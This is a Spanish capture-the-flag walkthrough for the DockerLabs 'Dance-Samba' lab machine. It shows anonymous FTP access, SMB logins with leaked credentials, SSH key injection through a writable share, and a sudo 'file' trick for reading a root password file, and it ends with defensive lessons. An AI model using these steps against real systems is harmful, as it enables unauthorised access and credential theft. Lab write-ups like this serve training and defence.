# Dance-Samba — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟡 Medio  
**SO:** Linux  
**Autor de la máquina:** d1se0  
**Fecha de creación:** 26/08/2024  
**Técnicas:** FTP Anonymous · SMB Enumeration · SSH Key Injection · Samba · GTFOBins · sudo file abuse

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración FTP](#2-enumeración-ftp)
3. [Enumeración SMB](#3-enumeración-smb)
4. [Acceso SSH mediante clave RSA](#4-acceso-ssh-mediante-clave-rsa)
5. [Escalada de privilegios](#5-escalada-de-privilegios)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh dance-samba.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo profundo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
```

Resultado:

```text
21/tcp open ftp
22/tcp open ssh
139/tcp open netbios-ssn
445/tcp open microsoft-ds
```

Servicios detectados:

```text
FTP Anonymous enabled
Samba
OpenSSH
```

---

## 2. Enumeración FTP

Accedemos al servicio FTP de forma anónima:

```bash
ftp 172.17.0.2
```

Usuario:

```text
anonymous
```

Listamos el contenido:

```bash
ls
```

Encontramos:

```text
nota.txt
```

Descargamos el archivo:

```bash
get nota.txt
```

Leemos el contenido:

```bash
cat nota.txt
```

Resultado:

```text
I don't know what to do with Macarena, she's obsessed with donald.
```

Obtenemos posibles credenciales:

```text
Usuario: macarena
Contraseña: donald
```

---

## 3. Enumeración SMB

Realizamos enumeración SMB:

```bash
enum4linux -a 172.17.0.2
```

Resultado:

```text
Usuario encontrado: macarena
Recursos compartidos SMB
```

Enumeramos permisos:

```bash
smbmap -H 172.17.0.2 -u macarena -p donald
```

Resultado:

```text
macarena  READ, WRITE
```

Accedemos al recurso compartido:

```bash
smbclient //172.17.0.2/macarena -U macarena
```

Listamos archivos:

```bash
ls
```

Encontramos:

```text
user.txt
```

Descargamos el archivo:

```bash
get user.txt
```

La compartición tiene permisos de escritura, por lo que aprovecharemos esto para añadir una clave SSH.

Creamos el directorio `.ssh`:

```bash
mkdir .ssh
cd .ssh
```

Generamos una clave RSA en nuestro host:

```bash
ssh-keygen -t rsa -b 2048
```

Copiamos la clave pública:

```bash
cat id_rsa.pub > authorized_keys
```

Subimos los archivos mediante SMB:

```bash
put id_rsa.pub
put authorized_keys
```

---

## 4. Acceso SSH mediante clave RSA

Accedemos utilizando nuestra clave privada:

```bash
ssh -i id_rsa macarena@172.17.0.2
```

Acceso correcto.

Explorando el sistema encontramos un directorio:

```bash
cd /home/secret
```

Dentro encontramos:

```text
hash
```

Leemos el contenido:

```bash
cat hash
```

El valor corresponde a una contraseña cifrada.

Utilizamos CyberChef para decodificarla.

Herramienta utilizada:

[CyberChef](https://gchq.github.io/CyberChef/?utm_source=chatgpt.com)

Resultado:

```text
supercontraseña
```

---

## 5. Escalada de privilegios

Comprobamos privilegios sudo:

```bash
sudo -l
```

Resultado:

```text
(ALL : ALL) /usr/bin/file
```

Explorando el sistema encontramos:

```text
/opt/password.txt
```

Consultamos GTFOBins para el binario `file`.

Payload utilizado:

```bash
LFILE=/opt/password.txt
sudo file -f $LFILE
```

Resultado:

```text
root:rooteable2
```

Cambiamos al usuario root:

```bash
su root
```

Contraseña:

```text
rooteable2
```

Verificamos privilegios:

```bash
whoami
root
```

✅ Somos **root**.

---

## 6. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| FTP Anonymous habilitado | Filtración de información |
| Contraseña débil SMB | Acceso inicial |
| Compartición SMB escribible | Persistencia mediante SSH |
| Información sensible almacenada localmente | Descubrimiento de credenciales |
| sudo sobre file | Lectura de archivos privilegiados |

**Para defenderse:**

- Deshabilitar acceso FTP anónimo.
- Restringir permisos de escritura en recursos SMB.
- Utilizar contraseñas robustas.
- No almacenar secretos accesibles localmente.
- Limitar binarios peligrosos ejecutables mediante sudo.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
